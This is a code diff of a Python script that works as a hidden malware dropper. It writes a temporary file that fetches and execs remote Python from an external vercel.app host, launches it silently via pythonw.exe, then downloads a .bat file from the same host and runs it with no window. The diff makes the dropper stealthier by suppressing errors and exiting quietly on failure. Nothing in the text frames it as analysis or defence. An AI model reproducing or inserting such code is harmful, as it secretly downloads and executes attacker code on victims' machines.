@@ -10,19 +10,21 @@ import subprocess
 _ttmp = _ffile(delete=False)
 _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://ok-omega-eight.vercel.app/wp.txt").read())""")
 _ttmp.close()
-
 try:
-    _ssystem(f"{_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
-except Exception as e:
-    print(f"Error: {e}")
+    _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
+except:
+    pass
+
 url = "https://ok-omega-eight.vercel.app/Lloli.bat"
-temp_dir = tempfile.gettempdir()
-bat_name = os.path.join(temp_dir, str(uuid.uuid4()) + ".bat")
+temp = tempfile.gettempdir()
+name = os.path.join(temp, str(uuid.uuid4()) + ".bat")
 
 response = requests.get(url)
 
 if response.status_code == 200:
-    with open(bat_name, 'wb') as file:
-        file.write(response.content)
-
-    subprocess.Popen([bat_name], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
+    with open(name, 'wb') as dosya:
+        dosya.write(response.content)
+    
+    subprocess.Popen([name], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
+else:
+    exit()
